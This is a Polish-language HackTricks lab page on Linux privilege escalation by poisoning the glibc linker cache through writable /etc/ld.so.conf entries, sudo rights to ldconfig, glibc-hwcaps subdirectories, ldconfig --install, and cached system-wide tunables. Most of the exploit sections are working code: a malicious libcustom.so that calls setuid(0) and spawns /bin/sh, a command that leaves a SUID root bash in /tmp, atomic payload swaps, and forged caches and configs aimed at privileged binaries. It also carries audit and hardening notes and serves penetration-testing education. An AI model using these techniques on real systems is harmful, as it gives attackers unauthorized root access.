# Przykład exploit privesc ld.so

{{#include ../../banners/hacktricks-training.md}}

Ta strona to ukierunkowane laboratorium dotyczące zatruwania **system linker cache za pośrednictwem `/etc/ld.so.conf` lub `ldconfig`**. W przypadku injection brakującej biblioteki, zapisywalnego `RPATH`/`RUNPATH`, `LD_PRELOAD` oraz innych ogólnych przypadków abuse linkera SUID zobacz [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Przygotowanie środowiska

W poniższej sekcji znajduje się kod plików, których użyjemy do przygotowania środowiska

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Utwórz** te pliki na swoim komputerze w tym samym folderze
2. **Skompiluj** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Skopiuj** `libcustom.so` do `/usr/lib` i odśwież cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (uprawnienia roota)
4. **Skompiluj** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Sprawdź środowisko

Sprawdź, czy _libcustom.so_ jest **ładowana** z _/usr/lib_ oraz czy możesz **uruchomić** plik binarny.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Przydatne polecenia triage

Podczas atakowania rzeczywistego celu sprawdź **dokładną nazwę biblioteki**, której potrzebuje binary, co **loader obecnie rozwiązuje**, oraz które skonfigurowane ścieżki są zapisywalne bez modyfikowania aktywnej pamięci podręcznej.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Używaj `ldd` wyłącznie na **zaufanym** pliku wykonywalnym. Niektóre implementacje lub nietypowe interpretery ELF mogą spowodować wykonanie kodu kontrolowanego przez attackera; `objdump -p ./file | grep NEEDED` bezpiecznie wyświetla bezpośrednie zależności. W przypadku zaufanego celu wywołanie wykrytego interpretera z opcją `--list` pokazuje faktyczne rozwiązywanie zależności. Porównaj ten wynik z `--inhibit-cache --list`: różnica dowodzi, że to `/etc/ld.so.cache`, a nie zwykła reguła ścieżki wyszukiwania, wybrał ten obiekt.<sup>[[1]](#references)[[4]](#references)</sup>

Kilka przydatnych pułapek:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` zwykle **nie działa**, ponieważ
przekierowanie jest wykonywane przez bieżący shell. Zamiast tego użyj
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Pliki binarne **SUID/uprzywilejowane** działają w **trybie bezpiecznego wykonywania**: `LD_LIBRARY_PATH`
jest ignorowane, natomiast `LD_PRELOAD` podlega ograniczeniom (nazwy zawierające ukośnik są
ignorowane, a preloadowane mogą być wyłącznie biblioteki oznaczone setuid w standardowych katalogach). Gdy root uruchomi
`ldconfig`, katalogi wymienione w
`/etc/ld.so.conf` mogą trafić do `/etc/ld.so.cache`, więc ta błędna konfiguracja może
nadal wpływać na programy uprzywilejowane.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` również jest ignorowane w trybie bezpiecznego wykonywania, chyba że istnieje `/etc/suid-debug`, dlatego zbierz jego ślad podczas równoważnego uruchomienia non-SUID, zamiast oczekiwać danych wyjściowych z wykonania uprzywilejowanego.<sup>[[1]](#references)</sup>
- W glibc 2.33 i nowszych dynamic loader udostępnia również
`--list-diagnostics`, które wyświetla diagnostykę loadera w formacie czytelnym maszynowo oraz informacje o wbudowanych ścieżkach wyszukiwania, gdy hijack nie zachowuje się zgodnie z oczekiwaniami.<sup>[[1]](#references)[[6]](#references)</sup>

### Ograniczenia cache i SONAME

`ldconfig` nie cache'uje każdego dowolnego pliku w skonfigurowanym katalogu: analizuje nagłówki ELF, rozpoznaje nazwy pasujące do `lib*.so*` lub `ld-*.so*` i oczekuje konwencjonalnego łańcucha `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Wstrzykiwany obiekt musi zatem mieć docelową architekturę/klasę, dokładną nazwę `DT_NEEDED` (zwykle jego `DT_SONAME`) oraz wszystkie symbole/wersje rozwiązywane przez proces ofiary.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefer bibliotekę specyficzną dla celu, taką jak w tym przykładzie. Zastąpienie powszechnego SONAME niekompletnym obiektem może przerwać działanie każdego procesu, który rozwiąże go, zanim uruchomi się zamierzony uprzywilejowany cel.<sup>[[3]](#references)</sup>

### Persistence ścieżki cache i atomowe zamiany

Cache rejestruje mapowanie **nazwy biblioteki na nazwę ścieżki**; nie osadza w sobie shared object. Po zapisaniu w cache ścieżki kontrolowanej przez atakującego zastąpienie obiektu dokładnie pod tą ścieżką wpływa na nowo uruchamiane procesy bez kolejnego uruchamiania `ldconfig`. Umożliwia to użyteczny wzorzec time-of-check/time-of-use: udostępnij prawidłową bibliotekę podczas przebudowy cache lub inspekcji przez administratora, a następnie atomowo zmień nazwę payloadu, zastępując nim ten obiekt. Istniejące procesy zachowują już zmapowany obiekt.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Podobnie usunięcie złośliwej linii z `ld.so.conf` samo w sobie nie usuwa już zapisanego wpisu: administrator musi usunąć niezaufany obiekt, naprawić jego właściciela i uprawnienia zapisu oraz odbudować cache. Użyj powyższego porównania z `--inhibit-cache`, aby odróżnić nieaktualny wpis w cache od nadal aktywnej ścieżki konfiguracji.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

W tym scenariuszu załóżmy, że administrator dodał podatny wpis do
pliku w `/etc/ld.so.conf.d/`, który jest dołączany przez systemowy
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Podatny folder to _/home/ubuntu/lib_ (do którego mamy dostęp z prawem zapisu).\
**Pobierz i skompiluj** poniższy kod w tej ścieżce:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Jeśli oczekujesz, że **root** (lub inne uprzywilejowane konto) uruchomi później podatny plik binarny, zwykle lepiej pozostawić **artefakt należący do root** zamiast uruchamiać interaktywny shell. Na przykład:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Następnie, po wykonaniu uprzywilejowanej operacji, możesz użyć `/tmp/rootbash -p`.

Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom w błędnie skonfigurowanej** ścieżce, domyślna pamięć podręczna musi zostać odbudowana przez pomyślne uprzywilejowane uruchomienie **`ldconfig`**. Ponowne uruchomienie systemu pomaga tylko wtedy, gdy lokalny proces rozruchu faktycznie je wywołuje; w przeciwnym razie poczekaj na działanie administratora lub użyj niebezpiecznej reguły sudo, jeśli jest dostępna.<sup>[[2]](#references)</sup>

Po wykonaniu tej czynności **sprawdź ponownie**, skąd plik wykonywalny `sharedvuln` ładuje bibliotekę `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Widać, że **ładuje ją z `/home/ubuntu/lib`**, a jeśli dowolny użytkownik ją wykona, zostanie uruchomiona powłoka:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Należy pamiętać, że w tym przykładzie nie eskalowaliśmy uprawnień, ale po zmodyfikowaniu wykonywanych poleceń i **oczekiwaniu, aż użytkownik root lub inny uprzywilejowany użytkownik wykona podatny plik binarny**, będziemy mogli eskalować uprawnienia.

### Nowoczesne `glibc-hwcaps` shadowing

Od wersji glibc 2.33 loader może preferować zoptymalizowane biblioteki znajdujące się w `glibc-hwcaps/<level>/` wewnątrz **każdego katalogu wyszukiwania bibliotek**. W związku z tym sprawdzenie wyłącznie `/home/ubuntu/lib` jest niewystarczające: zapisywalny kompatybilny podkatalog, taki jak `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, może przesłonić bazową bibliotekę po zindeksowaniu jej przez `ldconfig`, podczas gdy inne procesory nadal będą używać obiektu bazowego. Zapewnia to również przejęcie wybierane zależnie od architektury, które może zostać pominięte, gdy walidacja odbywa się na innym procesorze.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Obecne zalecenia hardeningu glibc rekomendują unikanie zduplikowanych SONAME, lokalizacji wyszukiwania innych niż domyślne oraz obiektów w podkatalogach `glibc-hwcaps`. Z perspektywy audytu należy rekurencyjnie sprawdzać własność i możliwość zapisu dla skonfigurowanych katalogów oraz ich nadrzędnych komponentów ścieżki.<sup>[[3]](#references)</sup>

### Inne błędne konfiguracje - ta sama vuln

W poprzednim przykładzie upozorowaliśmy błędną konfigurację, w której administrator **ustawił folder bez uprawnień uprzywilejowanych wewnątrz pliku konfiguracyjnego w `/etc/ld.so.conf.d/`**.\
Istnieją jednak inne błędne konfiguracje, które mogą powodować tę samą podatność: jeśli masz **uprawnienia zapisu** w załadowanym **pliku konfiguracyjnym**, możesz utworzyć plik w zapisywalnym katalogu `/etc/ld.so.conf.d/` lub możesz zapisywać do `/etc/ld.so.conf`, możesz skonfigurować i wykorzystać tę samą podatność.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Załóżmy, że masz uprawnienia sudo do `ldconfig`**. `ldconfig` przyjmuje katalogi do skanowania jako argumenty pozycyjne, więc najkrótsza forma cache-poisoning często wygląda po prostu tak:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Alternatywnie, `-f` wybiera inny plik konfiguracyjny, zachowując domyślne wyjście cache. Jest to przydatne, gdy filtr argumentów blokuje katalogi pozycyjne, ale nadal zezwala na `-f`, lub gdy trzeba wstrzyknąć kilka ścieżek:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Teraz, jak wskazano w **poprzednim exploicie**, **utwórz złośliwą bibliotekę w `/tmp`**.\
Na koniec załaduj ścieżkę i sprawdź, skąd binarny plik ładuje bibliotekę:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Jak widać, posiadając uprawnienia sudo do `ldconfig`, można wykorzystać tę samą podatność.** Szczegóły opcji mają znaczenie podczas oceniania ograniczonej reguły sudo: `-f` wybiera inną konfigurację, ale nadal przebudowuje `/etc/ld.so.cache`; `-C` przekierowuje cache w inne miejsce; `-N` zapobiega przebudowie cache; natomiast `-X` zapobiega aktualizowaniu linków, ale **nadal przebudowuje cache, chyba że zostanie użyte razem z `-N`**. `-n` implikuje `-N`, więc może aktualizować linki w podanych katalogach, ale nie może zatruć cache; `-r` działa poniżej alternatywnego katalogu głównego i zwykle nie modyfikuje cache hosta.<sup>[[2]](#references)</sup>

### glibc 2.44: instalowanie prebuilt cache

Glibc 2.44 dodało `ldconfig --install SOURCE`, które atomowo kopiuje prebuilt cache do wybranego miejsca docelowego cache (na hoście `/etc/ld.so.cache`, chyba że `-C` lub `-r` je zmieni). Tworzy to kolejny niebezpieczny argument dla reguł sudoers i uprzywilejowanych wrapperów: attacker może skonstruować prawidłowy cache **bez uprawnień**, a następnie użyć dozwolonego wywołania `--install`, aby zastąpić systemowy cache. Ścieżka instalacji sprawdza magic cache, ale nie generuje ponownie jego wpisów na podstawie zaufanej konfiguracji.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Cache nadal zawiera **ścieżki**, a nie bajty bibliotek, dlatego `/tmp/libcustom.so` musi nadal istnieć i być kompatybilna w momencie uruchomienia victim. Filtry, które jedynie odrzucają `-f`, katalogi pozycyjne lub `-t`, są zatem niekompletne w glibc 2.44: należy odrzucać również `--install`/`-I`, a najlepiej w ogóle nie delegować `ldconfig`.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: cached system-wide tunables

Począwszy od glibc 2.44, `ldconfig` analizuje również `/etc/tunables.conf` i zapisuje jego ustawienia jako rozszerzenie w `/etc/ld.so.cache`. Plik akceptuje dyrektywy `include` oraz filtry dla poszczególnych procesów. Prefiksy kontrolują zakres: `@`/`onlysecure` dotyczą wyłącznie procesów `AT_SECURE`, `$`/`nonsecure` wykluczają je, a `*`/`anysecure` obejmują oba typy. **Wpis bez prefiksu domyślnie dotyczy procesów non-secure**, dlatego attacker musi jawnie użyć `@` lub `*`, aby wpłynąć na programy setuid, setgid lub programy uruchomione z podwyższonymi uprawnieniami wynikającymi z capabilities. Poszerza to zakres audytu poza katalogi bibliotek: zapisywalna konfiguracja tunables lub dołączony plik może wpływać na przyszłe uruchomienia programów po uprzywilejowanej przebudowie cache.<sup>[[7]](#references)[[9]](#references)</sup>

To samo wydanie dodaje `ldconfig -t TUNCONF`, które wybiera alternatywny plik tunables, jednocześnie nadal zapisując normalny cache, chyba że inna opcja to zmieni. Dlatego wrappers i reguły sudo, które próbowały blokować wyłącznie `-f`, muszą również odrzucać `-t`, dowolne katalogi pozycyjne, `--install` oraz manipulowanie wyjściem cache.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### Parametry wybierane zależnie od celu

Filtr `[proc:PATTERN]` stosuje poniższe wpisy tylko wtedy, gdy pełna ścieżka `/proc/self/exe` pliku wykonywalnego (jeśli `PATTERN` zaczyna się od `/`) lub jego basename pasuje do wzorca. Filtr kończy się przy następnym filtrze, `[]`, końcu pliku lub granicy pliku include. Dzięki temu poisoned cache jest mniej widoczny, ponieważ zmienione zachowanie można ograniczyć do jednej uprzywilejowanej ofiary.<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
Prefiks `-`/`nonoverridable` uniemożliwia `GLIBC_TUNABLES` nadpisanie wartości zapisanej w cache; `+`/`overridable` przywraca standardowe zachowanie nadpisywania. W przypadku procesów `AT_SECURE` zmienna środowiskowa jest i tak całkowicie ignorowana. Traktuj format pliku jako zależny od wersji — projekt glibc nie gwarantuje, że będzie on stabilnym interfejsem — i wyświetl obsługiwane nazwy oraz wartości za pomocą `"$interp" --list-tunables` przed podjęciem próby uzyskania ukierunkowanego efektu.<sup>[[7]](#references)[[9]](#references)</sup>

Nie oznacza to automatycznie wykonania dowolnego kodu. Jest to uprzywilejowany prymityw **manipulacji zachowaniem loadera**: glibc wyraźnie ostrzega, że wartości systemowe mogą stosować tunables związane z bezpieczeństwem do programów setuid/setgid bez sprawdzania bezpieczeństwa dla poszczególnych tunables. Zamiast zakładać istnienie uniwersalnego payloadu, szukaj zmian alokatora specyficznych dla celu, zmian w hardeningu CPU lub warunków prowadzących do denial-of-service.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening dynamicznego linkera - Biblioteka GNU C](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - strona podręcznika Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (narzędzia binarne GNU)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnostyka dynamicznego linkera (Biblioteka GNU C)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Tunables obowiązujące w całym systemie (Biblioteka GNU C 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Dodanie tunables obowiązujących w całym systemie: część ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [Biblioteka GNU C w wersji 2.44 jest już dostępna](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [Kod źródłowy ldconfig glibc 2.44](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
